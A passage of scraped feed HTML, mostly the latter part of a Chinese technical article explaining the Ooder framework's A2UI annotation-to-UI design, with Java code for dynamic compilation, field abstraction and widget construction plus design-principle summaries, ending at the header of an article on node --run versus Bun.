        aggregationBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AggregationBean</span>(aggregationClass);
    }

    <span class="hljs-comment">// ...</span>
}
</code></pre>
<h4 data-id="heading-42">设计思考：</h4>
<ol>
<li><strong>为什么需要构建阶段？</strong>
<ul>
<li>将类信息加载到内存</li>
<li>创建统一的数据结构</li>
<li>为后续处理做准备</li>
</ul>
</li>
<li><strong>为什么需要缓存字段和方法？</strong>
<ul>
<li>避免重复反射</li>
<li>提高性能</li>
<li>支持懒加载</li>
</ul>
</li>
</ol>
<h3 data-id="heading-43">2. 编译阶段</h3>
<p>编译阶段是指动态编译Java类，并注册到Spring容器。</p>
<p>SpringContainerClassLoaderJavaCompilerBridgeClassUserSpringContainerClassLoaderJavaCompilerBridgeClassUser动态编译编译Java源码加载编译后的类注册Bean注册成功返回Class对象</p>
<p><strong>核心代码分析：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">public <span class="hljs-keyword">void</span> <span class="hljs-title function_">compileJavaSrc</span>(<span class="hljs-params">List&lt;JavaSrcMeta&gt; srcBeanList, <span class="hljs-built_in">String</span> projectName, ChromeProxy chrome</span>) {
    D2CGenerator javaGen = D2CGenerator.<span class="hljs-title function_">getInstance</span>(projectName);
    <span class="hljs-keyword">try</span> {
        javaGen.<span class="hljs-title function_">compileJavaSrc</span>(srcBeanList, chrome);
    } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">JDSException</span> e) {
        e.<span class="hljs-title function_">printStackTrace</span>();
    }

    <span class="hljs-title class_">Set</span>&lt;<span class="hljs-title class_">Class</span>?&gt;&gt; classSet = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();
    <span class="hljs-comment">// 更新服务注册</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">JavaSrcMeta</span> srcBean : srcBeanList) {
        <span class="hljs-title class_">Class</span> clazz = <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">try</span> {
            clazz = <span class="hljs-title class_">ClassUtility</span>.<span class="hljs-title function_">loadClass</span>(srcBean.<span class="hljs-title function_">getClassName</span>());
            classSet.<span class="hljs-title function_">add</span>(clazz);
            <span class="hljs-title function_">registerClass</span>(clazz);
        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">ClassNotFoundException</span> e) {
            log.<span class="hljs-title function_">warn</span>(e.<span class="hljs-title function_">getMessage</span>());
        }
    }
    <span class="hljs-title class_">APIConfigFactory</span>.<span class="hljs-title function_">getInstance</span>().<span class="hljs-title function_">dyReload</span>(classSet);
}

public <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerClass</span>(<span class="hljs-params">Class clazz</span>) {
    <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(clazz, <span class="hljs-title class_">Aggregation</span>.<span class="hljs-property">class</span>) != <span class="hljs-literal">null</span>
                || <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(clazz, <span class="hljs-title class_">EsbBeanAnnotation</span>.<span class="hljs-property">class</span>) != <span class="hljs-literal">null</span>) {
            <span class="hljs-title class_">EsbBeanFactory</span>.<span class="hljs-title function_">getInstance</span>().<span class="hljs-title function_">registerService</span>(clazz);
        }
        <span class="hljs-title class_">String</span> className = clazz.<span class="hljs-title function_">getName</span>();
        <span class="hljs-keyword">try</span> {
            classManager.<span class="hljs-title function_">clear</span>(className);
            <span class="hljs-title class_">APIConfigFactory</span>.<span class="hljs-title function_">getInstance</span>().<span class="hljs-title function_">reload</span>(className);
            <span class="hljs-title class_">APIFactory</span>.<span class="hljs-title function_">getInstance</span>().<span class="hljs-title function_">loadApiConfig</span>(className);
            <span class="hljs-title class_">ClassUtility</span>.<span class="hljs-title function_">loadClass</span>(className);

        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) {
        }
    }
}
</code></pre>
<h4 data-id="heading-44">设计思考：</h4>
<ol>
<li><strong>为什么需要动态编译？</strong>
<ul>
<li>支持运行时生成代码</li>
<li>支持热部署</li>
<li>提高开发效率</li>
</ul>
</li>
<li><strong>为什么需要注册到Spring容器？</strong>
<ul>
<li>支持依赖注入</li>
<li>支持AOP</li>
<li>支持事务管理</li>
</ul>
</li>
</ol>
<h3 data-id="heading-45">3. 列结构抽象阶段</h3>
<p>列结构抽象阶段是指提取字段列表，确定字段类型，建立字段映射关系。</p>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea62ab1855f644ee95b5dc30afbe09f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=UIxH2SPmQDp2AZvNuwuiCN3Ue%2FM%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<p><strong>核心代码分析：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">void</span> <span class="hljs-title function_">initField</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">BridgeField</span>&gt; fieldMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();
    <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">BridgeField</span>&gt; disableFieldMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();
    <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">CustomAnnotation</span>&gt; customAnnotationMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();
    int index = <span class="hljs-number">0</span>;

    <span class="hljs-comment">// 并行处理字段初始化</span>
    <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">Callable</span>&lt;<span class="hljs-title class_">BridgeFieldConfig</span>&gt;&gt; fieldTasks = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Field</span> field : allCtFields) {
        fieldTasks.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InitFieldTask</span>&lt;&gt;(field, index, <span class="hljs-variable language_">this</span>));
        index++;
    }
    <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">BridgeFieldConfig</span>&gt; fields = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">invokFieldTasks</span>(className, fieldTasks);

    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">BridgeFieldConfig</span> fieldInfo : fields) {
        <span class="hljs-title class_">Field</span> field = fieldInfo.<span class="hljs-property">field</span>;
        <span class="hljs-keyword">if</span> (fieldInfo.<span class="hljs-title function_">isSerialize</span>()) {
            fieldMap.<span class="hljs-title function_">put</span>(field.<span class="hljs-title function_">getName</span>().<span class="hljs-title function_">toLowerCase</span>(), fieldInfo);
            esdFieldMap.<span class="hljs-title function_">put</span>(fieldInfo.<span class="hljs-title function_">getFieldName</span>(), fieldInfo);
            fieldNameList.<span class="hljs-title function_">add</span>(fieldInfo.<span class="hljs-title function_">getFieldName</span>());
        } <span class="hljs-keyword">else</span> {
            disableFieldMap.<span class="hljs-title function_">put</span>(field.<span class="hljs-title function_">getName</span>().<span class="hljs-title function_">toLowerCase</span>(), fieldInfo);
            disableFieldList.<span class="hljs-title function_">add</span>(fieldInfo);
        }

        <span class="hljs-keyword">if</span> (fieldInfo.<span class="hljs-title function_">isUid</span>()) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">uid</span> = field.<span class="hljs-title function_">getName</span>();
        }

        <span class="hljs-keyword">if</span> (fieldInfo.<span class="hljs-title function_">isCaptionField</span>()) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">captionField</span> = fieldInfo;
        }
    }
}
</code></pre>
<h4 data-id="heading-46">设计思考：</h4>
<ol>
<li><strong>为什么需要列结构抽象？</strong>
<ul>
<li>统一字段的数据结构</li>
<li>支持字段的批量处理</li>
<li>提高字段处理的效率</li>
</ul>
</li>
<li><strong>为什么需要区分fieldMap和disableFieldMap？</strong>
<ul>
<li>fieldMap：需要显示的字段</li>
<li>disableFieldMap：不需要显示的字段</li>
<li>分离关注点，提高处理效率</li>
</ul>
</li>
</ol>
<h3 data-id="heading-47">4. 建模阶段</h3>
<p>建模阶段是指创建UI组件，建立组件层次结构，配置组件属性，绑定数据源。</p>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/772ea3a5a34041e0a496988440769eae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=mC%2Bhpx58NVXtt1ekda3Y%2BvNA0OI%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<p><strong>核心代码分析：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">public <span class="hljs-keyword">void</span> <span class="hljs-title function_">initWidget</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Class</span>? clazz = <span class="hljs-literal">null</span>;
    <span class="hljs-title class_">ComponentType</span>[] skipComs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ComponentType</span>[]{<span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">TOOLBAR</span>, <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">APICALLER</span>, <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>, <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">INPUT</span>, <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">LIST</span>};
    <span class="hljs-title class_">Class</span>&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt;[] skipAnnotations = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{<span class="hljs-title class_">ComboInputAnnotation</span>.<span class="hljs-property">class</span>, <span class="hljs-title class_">ToolBarMenu</span>.<span class="hljs-property">class</span>, <span class="hljs-title class_">ListAnnotation</span>.<span class="hljs-property">class</span>, <span class="hljs-title class_">InputAnnotation</span>.<span class="hljs-property">class</span>, <span class="hljs-title class_">APIEventAnnotation</span>.<span class="hljs-property">class</span>};

    <span class="hljs-keyword">if</span> (componentType == <span class="hljs-literal">null</span> || <span class="hljs-title class_">Arrays</span>.<span class="hljs-title function_">asList</span>(skipComs).<span class="hljs-title function_">contains</span>(componentType)) {
        <span class="hljs-title class_">CustomClass</span> customClass = C2UConfigFactory.<span class="hljs-title function_">getInstance</span>().<span class="hljs-title function_">getWidgetCustomAnnotation</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAllAnnotation</span>().<span class="hljs-title function_">toArray</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Annotation</span>[]{}));
        <span class="hljs-keyword">if</span> (customClass != <span class="hljs-literal">null</span>) {
            componentType = customClass.<span class="hljs-title function_">componentType</span>();
        }

        <span class="hljs-keyword">if</span> (componentType == <span class="hljs-literal">null</span> || componentType.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">INPUT</span>)) {
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAnnotation</span>(<span class="hljs-title class_">InputAnnotation</span>.<span class="hljs-property">class</span>) != <span class="hljs-literal">null</span>) {
                componentType = <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">INPUT</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAnnotation</span>(<span class="hljs-title class_">ListAnnotation</span>.<span class="hljs-property">class</span>) != <span class="hljs-literal">null</span>) {
                componentType = <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">LIST</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAnnotation</span>(<span class="hljs-title class_">ToolBarMenu</span>.<span class="hljs-property">class</span>) != <span class="hljs-literal">null</span>) {
                componentType = <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">TOOLBAR</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAnnotation</span>(<span class="hljs-title class_">APIEventAnnotation</span>.<span class="hljs-property">class</span>) != <span class="hljs-literal">null</span>) {
                componentType = <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">APICALLER</span>;
            }
        }
    }

    <span class="hljs-keyword">try</span> {
        clazz = C2UConfigFactory.<span class="hljs-title function_">getInstance</span>().<span class="hljs-title function_">getDefaultWidgetClass</span>(componentType);
        <span class="hljs-title class_">Constructor</span> constructor = <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">try</span> {
            constructor = clazz.<span class="hljs-title function_">getConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{<span class="hljs-title class_">BridgeField</span>.<span class="hljs-property">class</span>, <span class="hljs-title class_">Set</span>.<span class="hljs-property">class</span>});
            widgetConfig = (M) constructor.<span class="hljs-title function_">newInstance</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-variable language_">this</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAllAnnotation</span>()});
        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">NoSuchMethodException</span> e) {
            constructor = clazz.<span class="hljs-title function_">getConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{<span class="hljs-title class_">Set</span>.<span class="hljs-property">class</span>});
            widgetConfig = (M) constructor.<span class="hljs-title function_">newInstance</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAllAnnotation</span>()});
        }
    } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Throwable</span> e) {
        e.<span class="hljs-title function_">printStackTrace</span>();
    }
}
</code></pre>
<h4 data-id="heading-48">设计思考：</h4>
<ol>
<li><strong>为什么需要建模阶段？</strong>
<ul>
<li>创建UI组件实例</li>
<li>建立组件层次结构</li>
<li>配置组件属性</li>
</ul>
</li>
<li><strong>为什么需要多种构造函数？</strong>
<ul>
<li>支持不同的初始化方式</li>
<li>支持不同的参数组合</li>
<li>提高灵活性</li>
</ul>
</li>
</ol>
<h2 data-id="heading-49">架构优势与设计哲学</h2>
<h3 data-id="heading-50">1. 架构优势</h3>
<p>A2UI架构具有以下优势：</p>
<h4 data-id="heading-51">1.1 可扩展性</h4>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bb7c492127104c74ba7b7e4c73b1247e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=swGE5GNygTJs64OhBS82pAkiPNc%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<h4 data-id="heading-52">设计思考：</h4>
<ol>
<li><strong>注解扩展</strong>
<ul>
<li>通过添加新的注解支持新功能</li>
<li>注解的解析规则是统一的</li>
<li>不需要修改核心代码</li>
</ul>
</li>
<li><strong>组件扩展</strong>
<ul>
<li>通过添加新的UI组件支持新UI元素</li>
<li>组件的注册机制是统一的</li>
<li>不需要修改核心代码</li>
</ul>
</li>
<li><strong>类型扩展</strong>
<ul>
<li>通过添加新的类型映射支持新数据类型</li>
<li>类型映射的规则是统一的</li>
<li>不需要修改核心代码</li>
</ul>
</li>
</ol>
<h4 data-id="heading-53">1.2 可维护性</h4>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b9506434b6e41539a20cf8ed3b7ed13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=Xbiry0f8Mf1%2B2lHMvD56Pl6evF8%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<h4 data-id="heading-54">设计思考：</h4>
<ol>
<li><strong>分层架构</strong>
<ul>
<li>每层有明确的职责</li>
<li>层与层之间通过接口通信</li>
<li>便于理解和维护</li>
</ul>
</li>
<li><strong>单一职责</strong>
<ul>
<li>每个类只负责一个功能</li>
<li>类的职责清晰</li>
<li>便于测试和维护</li>
</ul>
</li>
<li><strong>集中规则</strong>
<ul>
<li>规则集中在配置类中</li>
<li>便于修改和扩展</li>
<li>避免规则分散</li>
</ul>
</li>
</ol>
<h4 data-id="heading-55">1.3 确定性</h4>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f33cfde8024947af86da4a1d180bade4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=6FkehMpMVTSq%2Fjym4R3Ij7MghEs%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<h4 data-id="heading-56">设计思考：</h4>
<ol>
<li><strong>五层确定性</strong>
<ul>
<li>每层都有明确的确定性保障</li>
<li>层与层之间相互补充</li>
<li>保证结果的可预测性</li>
</ul>
</li>
<li><strong>有序处理</strong>
<ul>
<li>字段按照声明顺序处理</li>
<li>方法按照声明顺序处理</li>
<li>保证处理顺序的稳定性</li>
</ul>
</li>
<li><strong>固定规则</strong>
<ul>
<li>类型映射规则是固定的</li>
<li>组件映射规则是固定的</li>
<li>保证映射结果的一致性</li>
</ul>
</li>
</ol>
<h4 data-id="heading-57">1.4 灵活性</h4>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/928f0ee6baf14165beab075d64f28f22~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=UrQL0hLCRtCZTYk6tM2%2BlsZwU7s%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<h4 data-id="heading-58">设计思考：</h4>
<ol>
<li><strong>字段和方法两种定义方式</strong>
<ul>
<li>支持字段定义</li>
<li>支持方法定义</li>
<li>满足不同的开发习惯</li>
</ul>
</li>
<li><strong>注解覆盖默认行为</strong>
<ul>
<li>支持通过注解覆盖默认行为</li>
<li>支持灵活的配置</li>
<li>满足不同的业务需求</li>
</ul>
</li>
<li><strong>自定义组件映射</strong>
<ul>
<li>支持自定义组件映射</li>
<li>支持自定义组件</li>
<li>满足不同的UI需求</li>
</ul>
</li>
</ol>
<h3 data-id="heading-59">2. 设计哲学</h3>
<p>A2UI的设计哲学体现了以下原则：</p>
<h4 data-id="heading-60">2.1 约定优于配置</h4>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/39d23753c3dc44b88ab58a4d6dab7c09~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=kE5pbZWZ7SyOISQTEaeTWtYEKWQ%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<h4 data-id="heading-61">设计思考：</h4>
<ol>
<li><strong>默认行为</strong>
<ul>
<li>提供合理的默认值</li>
<li>减少配置的工作量</li>
<li>提高开发效率</li>
</ul>
</li>
<li><strong>最小配置</strong>
<ul>
<li>只在必要时配置</li>
<li>减少配置文件</li>
<li>简化项目结构</li>
</ul>
</li>
<li><strong>显式覆盖</strong>
<ul>
<li>需要时显式覆盖</li>
<li>配置意图明确</li>
<li>避免隐式行为</li>
</ul>
</li>
</ol>
<h4 data-id="heading-62">2.2 开闭原则</h4>
<p>​</p>
<p>​</p>
<p>​</p>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/506a676e4ca54460b41e4492a11fae12~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=aNN7otGkIMqX5tT3lcu8mcGWsyY%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<p>​</p>
<p>​</p>
<p>​</p>
<h4 data-id="heading-63">设计思考：</h4>
<ol>
<li><strong>对扩展开放</strong>
<ul>
<li>支持添加新的注解</li>
<li>支持添加新的组件</li>
<li>支持添加新的类型映射</li>
</ul>
</li>
<li><strong>对修改关闭</strong>
<ul>
<li>不需要修改核心代码</li>
<li>核心代码保持稳定</li>
<li>保证向后兼容</li>
</ul>
</li>
</ol>
<h4 data-id="heading-64">2.3 依赖倒置原则</h4>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8e6f28f714fd43688c11c05ab96c6344~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=m%2B2nwmagulKgp3KFt9CHgamL58g%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<h4 data-id="heading-65">设计思考：</h4>
<ol>
<li><strong>依赖抽象</strong>
<ul>
<li>依赖BridgeField接口</li>
<li>依赖BridgeClass接口</li>
<li>依赖BridgeMethodConfig接口</li>
</ul>
</li>
<li><strong>不依赖实现</strong>
<ul>
<li>不依赖具体的字段类</li>
<li>不依赖具体的组件类</li>
<li>不依赖具体的方法类</li>
</ul>
</li>
</ol>
<h4 data-id="heading-66">2.4 单一职责原则</h4>
<p>​</p>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9542af01c59a4788b4c8bcc703bfb01a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=adO5OZF5EdYAu4LxlM1T0rKYEKc%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<p>​</p>
<h4 data-id="heading-67">设计思考：</h4>
<ol>
<li><strong>一个类一个职责</strong>
<ul>
<li>BridgeClass：类分析</li>
<li>BridgeFieldConfig：字段配置</li>
<li>BridgeMethodConfig：方法配置</li>
<li>C2UConfigFactory：组件映射</li>
<li>OODTypeMapping：类型映射</li>
</ul>
</li>
<li><strong>专注的功能</strong>
<ul>
<li>每个类只负责一个功能</li>
<li>功能边界清晰</li>
<li>便于理解和维护</li>
</ul>
</li>
</ol>
<h2 data-id="heading-68">总结</h2>
<p>A2UI（Annotation to UI）是Ooder框架的核心组件，通过注解驱动的反射分析，将Java类自动转换为UI组件。其核心逻辑包括：</p>
<h3 data-id="heading-69">核心机制</h3>
<ol>
<li><strong>六阶段拆解流程</strong>
<ul>
<li>类加载阶段</li>
<li>注解解析阶段</li>
<li>字段拆解阶段</li>
<li>方法拆解阶段</li>
<li>类型映射阶段</li>
<li>组件生成阶段</li>
</ul>
</li>
<li><strong>五层确定性保障</strong>
<ul>
<li>注解层确定性</li>
<li>类型层确定性</li>
<li>命名约定层确定性</li>
<li>索引层确定性</li>
<li>映射规则层确定性</li>
</ul>
</li>
<li><strong>六大组织原则</strong>
<ul>
<li>字段优先原则</li>
<li>Getter/Setter识别原则</li>
<li>注解优先级原则</li>
<li>索引排序原则</li>
<li>类型推断原则</li>
<li>组件映射原则</li>
</ul>
</li>
</ol>
<h3 data-id="heading-70">设计优势</h3>
<ol>
<li><strong>可扩展性</strong>
<ul>
<li>支持注解扩展</li>
<li>支持组件扩展</li>
<li>支持类型扩展</li>
</ul>
</li>
<li><strong>可维护性</strong>
<ul>
<li>分层架构</li>
<li>单一职责</li>
<li>集中规则</li>
</ul>
</li>
<li><strong>确定性</strong>
<ul>
<li>五层确定性保障</li>
<li>有序处理</li>
<li>固定规则</li>
</ul>
</li>
<li><strong>灵活性</strong>
<ul>
<li>字段和方法两种定义方式</li>
<li>注解覆盖默认行为</li>
<li>自定义组件映射</li>
</ul>
</li>
</ol>
<h3 data-id="heading-71">设计哲学</h3>
<ol>
<li><strong>约定优于配置</strong>
<ul>
<li>提供合理的默认值</li>
<li>最小化配置</li>
<li>显式覆盖</li>
</ul>
</li>
<li><strong>开闭原则</strong>
<ul>
<li>对扩展开放</li>
<li>对修改关闭</li>
</ul>
</li>
<li><strong>依赖倒置原则</strong>
<ul>
<li>依赖抽象</li>
<li>不依赖实现</li>
</ul>
</li>
<li><strong>单一职责原则</strong>
<ul>
<li>一个类一个职责</li>
<li>专注的功能</li>
<li>易于测试</li>
</ul>
</li>
</ol>
<p>A2UI通过这些机制和原则，实现了从Java类到UI组件的自动化转换，为Ooder框架提供了强大的"配置即代码"能力。这一设计不仅提高了开发效率，也保证了系统的可维护性和可扩展性。</p>
<p>© 2024 Ooder Framework. All rights reserved.</p>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js 自带“加速器”：node --run 是否比 Bun 更快？]]></title>    <link>https://juejin.cn/post/7602246300454436899</link>    <guid>https://juejin.cn/post/7602246300454436899</guid>    <pubDate>2026-02-03T14:17:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602246300454436899" data-draft-id="7584353612501368873" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js 自带“加速器”：node --run 是否比 Bun 更快？"/> <meta itemprop="keywords" content="Bun,Node.js,deno"/> <meta itemprop="datePublished" content="2026-02-03T14:17:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Legend80s"/> <meta itemprop="url" content="https://juejin.cn/user/2568105753839790"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js 自带“加速器”：node --run 是否比 Bun 更快？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2568105753839790/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Legend80s
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T14:17:36.000Z" title="Tue Feb 03 2026 14:17:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
